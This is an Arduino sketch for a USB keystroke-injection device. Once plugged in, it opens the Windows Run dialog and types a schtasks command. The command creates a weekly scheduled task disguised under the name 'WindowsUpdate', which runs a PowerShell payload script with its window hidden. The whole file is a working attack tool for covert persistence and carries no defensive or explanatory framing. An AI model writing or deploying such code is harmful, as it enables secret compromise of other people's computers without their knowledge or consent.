#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("schtasks /create /tn \"WindowsUpdate\" /tr \"powershell -WindowStyle Hidden -File C:\\payload.ps1\" /sc weekly /mo 1 /d SUN"));
}

void loop() {}
